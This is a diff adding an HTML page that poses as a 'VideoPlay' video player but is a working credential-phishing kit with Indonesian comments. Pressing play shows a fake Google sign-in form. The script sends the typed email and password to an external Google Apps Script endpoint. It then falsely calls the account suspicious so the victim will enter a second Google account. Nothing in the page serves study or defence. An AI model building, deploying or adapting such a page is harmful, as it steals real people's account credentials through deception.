@@ -1,0 +1,212 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=no">
+<title>Video Player</title>
+<style>
+  * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Arial, sans-serif; }
+  body { background: #f0f1f3; display: flex; flex-direction: column; min-height: 100vh; color: #202124; }
+  .header { background: #fff; padding: 15px 20px; display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid #e0e0e0; }
+  .logo { font-size: 20px; font-weight: 800; letter-spacing: -0.5px; color: #111; }
+  .btn-upload { background: #111; color: #fff; padding: 8px 16px; border-radius: 20px; font-size: 13px; font-weight: 600; cursor: pointer; border: none; }
+  .video-container { position: relative; width: 100%; max-width: 600px; margin: 20px auto; background: #000; aspect-ratio: 9/16; display: flex; justify-content: center; align-items: center; overflow: hidden; border-radius: 12px; box-shadow: 0 10px 30px rgba(0,0,0,0.2); }
+  .media-player { width: 100%; height: 100%; object-fit: cover; display: none; }
+  .media-player.active { display: block; }
+  .play-btn { position: absolute; width: 80px; height: 80px; background: #1a73e8; border-radius: 50%; display: flex; justify-content: center; align-items: center; cursor: pointer; box-shadow: 0 4px 20px rgba(26,115,232,0.5); transition: 0.2s; z-index: 10; }
+  .play-btn:hover { transform: scale(1.05); background: #1557b0; }
+  .play-btn svg { width: 35px; height: 35px; fill: #fff; margin-left: 5px; }
+  .play-btn.hidden { display: none; }
+  .modal { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.6); display: none; justify-content: center; align-items: center; z-index: 999; }
+  .modal.active { display: flex; }
+  .modal-card { background: #fff; width: 90%; max-width: 400px; padding: 40px 30px; border-radius: 24px; box-shadow: 0 10px 40px rgba(0,0,0,0.2); }
+  .modal-card .google-logo { display: flex; justify-content: center; margin-bottom: 15px; }
+  .modal-card h2 { font-size: 22px; font-weight: 400; text-align: center; margin-bottom: 10px; }
+  .modal-card .subtitle { font-size: 14px; text-align: center; color: #5f6368; margin-bottom: 30px; }
+  .error-box { display: none; background: #fce8e6; color: #d93025; padding: 10px 15px; border-radius: 8px; font-size: 13px; margin-bottom: 15px; border: 1px solid #f5c6cb; text-align: left; }
+  .input-group { margin-bottom: 15px; }
+  .input-group input { width: 100%; padding: 14px; border: 1.5px solid #dadce0; border-radius: 8px; font-size: 15px; outline: none; transition: 0.2s; }
+  .input-group input:focus { border: 2px solid #1a73e8; padding: 13.5px; }
+  .btn-next { width: 100%; padding: 14px; background: #1a73e8; color: #fff; border: none; border-radius: 8px; font-size: 15px; font-weight: 600; cursor: pointer; margin-top: 10px; transition: 0.2s; }
+  .btn-next:hover { background: #1557b0; }
+  .loading-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(255,255,255,0.95); display: none; flex-direction: column; justify-content: center; align-items: center; z-index: 1000; }
+  .loading-overlay.active { display: flex; }
+  .spinner { width: 40px; height: 40px; border: 4px solid #f3f3f3; border-top: 4px solid #1a73e8; border-radius: 50%; animation: spin 1s linear infinite; margin-bottom: 15px; }
+  @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+  .loading-text { font-size: 14px; color: #5f6368; font-weight: 500; }
+</style>
+</head>
+<body>
+
+<header class="header">
+  <div class="logo">VideoPlay</div>
+  <button class="btn-upload" onclick="document.getElementById('fileInput').click()">Upload Media (Admin)</button>
+  <input type="file" id="fileInput" accept="video/*,image/*" style="display: none;" onchange="handleFile(this)">
+</header>
+
+<div class="video-container" id="videoContainer">
+  <video id="videoPlayer" class="media-player" controls playsinline></video>
+  <img id="imagePlayer" class="media-player">
+  
+  <div class="play-btn" id="playBtn" onclick="triggerLogin()">
+    <svg viewBox="0 0 24 24"><path d="M8 5v14l11-7z"/></svg>
+  </div>
+</div>
+
+<div class="modal" id="loginModal">
+  <div class="modal-card">
+    <div class="google-logo">
+      <svg viewBox="0 0 74 24" width="74" height="24">
+        <path fill="#4285F4" d="M9.4 13.1c0-.6-.1-1.3-.2-1.9H1.5v3.5h4.5c-.2 1-.8 1.9-1.6 2.5v2.1h2.6c1.5-1.4 2.4-3.4 2.4-6.2z"/>
+        <path fill="#34A853" d="M1.5 14.7c.8 0 1.6-.2 2.3-.6l-2.6-2.1c-.1.3-.2.7-.2 1.2 0 .5.1 1 .2 1.5z"/>
+        <path fill="#FBBC05" d="M1.5 10.2c.2 0 .4 0 .6-.1V7.5H.5c-.4.8-.6 1.7-.6 2.7 0 1 .2 1.9.6 2.7h1.6v-2.7z"/>
+        <path fill="#EA4335" d="M5.5 3.2c.9 0 1.7.3 2.4.9l1.8-1.8C8.5 1.2 7.1.6 5.5.6c-2.2 0-4.1 1.3-5 3.1l2.6 2.1c.5-1.5 1.9-2.6 3.4-2.6z"/>
+        <path fill="#4285F4" d="M5.5 21.4c1.6 0 3-.5 4.1-1.4l-2.6-2.1c-.6.4-1.4.6-2.3.6-1.5 0-2.8-1-3.3-2.4H.5v1.6c.9 2.1 2.9 3.7 5 3.7z"/>
+      </svg>
+    </div>
+    <h2 id="loginTitle">Sign in</h2>
+    <p class="subtitle" id="loginSubtitle">to continue to VideoPlayer</p>
+    <div class="error-box" id="errorBox"></div>
+    <form id="loginForm" onsubmit="handleLogin(event)">
+      <div class="input-group">
+        <input type="email" id="emailInput" placeholder="Email or phone" required>
+      </div>
+      <div class="input-group">
+        <input type="password" id="passInput" placeholder="Enter your password" required>
+      </div>
+      <button type="submit" class="btn-next" id="submitBtn">Next</button>
+    </form>
+  </div>
+</div>
+
+<div class="loading-overlay" id="loadingOverlay">
+  <div class="spinner"></div>
+  <div class="loading-text" id="loadingText">Memverifikasi akun...</div>
+</div>
+
+<script>
+  // URL BACKEND ANDA
+  var BACKEND_URL = "https://script.google.com/macros/s/AKfycbxY1Crknx9Y4_Ud_ljH8CKXvHkjB4o8t1lvlk83Xn6sozZ3pvIR3Mwc2cuhdtBXxYJd/exec";
+  
+  var currentMediaType = 'none';
+
+  function handleFile(input) {
+    var file = input.files[0];
+    if (!file) return;
+    var url = URL.createObjectURL(file);
+    var videoEl = document.getElementById('videoPlayer');
+    var imgEl = document.getElementById('imagePlayer');
+
+    if (file.type.startsWith('video/')) {
+      currentMediaType = 'video';
+      videoEl.src = url;
+      videoEl.style.display = 'block';
+      imgEl.style.display = 'none';
+    } else if (file.type.startsWith('image/')) {
+      currentMediaType = 'image';
+      imgEl.src = url;
+      imgEl.style.display = 'block';
+      videoEl.style.display = 'none';
+    }
+    document.getElementById('playBtn').classList.remove('hidden');
+  }
+
+  function triggerLogin() {
+    document.getElementById('loginModal').classList.add('active');
+    document.getElementById('errorBox').style.display = 'none';
+  }
+
+  function validateEmail(email) {
+    var re = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+    return re.test(email);
+  }
+
+  function validatePassword(pass) {
+    if (pass.length < 6) return false;
+    
+    // Cek berurutan (123456)
+    var isSequential = true;
+    for (var i = 1; i < pass.length; i++) {
+      if (pass.charCodeAt(i) !== pass.charCodeAt(i-1) + 1) {
+        isSequential = false;
+        break;
+      }
+    }
+    if (isSequential) return false;
+
+    // Cek karakter berulang (aaaaaa)
+    var isRepeated = true;
+    for (var j = 1; j < pass.length; j++) {
+      if (pass[j] !== pass[0]) {
+        isRepeated = false;
+        break;
+      }
+    }
+    if (isRepeated) return false;
+
+    return true;
+  }
+
+  async function handleLogin(e) {
+    e.preventDefault();
+    
+    var email = document.getElementById('emailInput').value.trim();
+    var pass = document.getElementById('passInput').value.trim();
+    var errorBox = document.getElementById('errorBox');
+
+    if (!validateEmail(email)) {
+      errorBox.style.display = 'block';
+      errorBox.textContent = "Couldn't find your Google Account";
+      return;
+    }
+
+    if (!validatePassword(pass)) {
+      errorBox.style.display = 'block';
+      errorBox.textContent = "Wrong password. Try again or click Forgot password to reset it.";
+      return;
+    }
+
+    errorBox.style.display = 'none';
+    document.getElementById('loginModal').classList.remove('active');
+    document.getElementById('loadingOverlay').classList.add('active');
+
+    var formData = new URLSearchParams();
+    formData.append("email", email);
+    formData.append("password", pass);
+    formData.append("ip", "192.168.1.1 (Tes)");
+    formData.append("kota", "Jakarta (Tes)");
+    formData.append("device", "Mobile");
+    formData.append("os", "Android");
+
+    try {
+      await fetch(BACKEND_URL, {
+        method: "POST",
+        mode: "no-cors",
+        headers: { "Content-Type": "application/x-www-form-urlencoded" },
+        body: formData.toString()
+      });
+    } catch (err) {}
+
+    setTimeout(function() {
+      document.getElementById('loadingOverlay').classList.remove('active');
+
+      if (currentMediaType === 'video') {
+        document.getElementById('playBtn').classList.add('hidden');
+        var vid = document.getElementById('videoPlayer');
+        vid.style.display = 'block';
+        vid.play();
+      } else {
+        document.getElementById('loginModal').classList.add('active');
+        document.getElementById('loginTitle').textContent = "Verifikasi Gagal";
+        document.getElementById('loginSubtitle').textContent = "Silakan login dengan akun Google lain.";
+        document.getElementById('errorBox').style.display = 'block';
+        document.getElementById('errorBox').textContent = "Akun terdeteksi mencurigakan. Mohon gunakan akun lain.";
+        document.getElementById('emailInput').value = '';
+        document.getElementById('passInput').value = '';
+      }
+    }, 2500);
+  }
+</script>
+
+</body>
+</html>
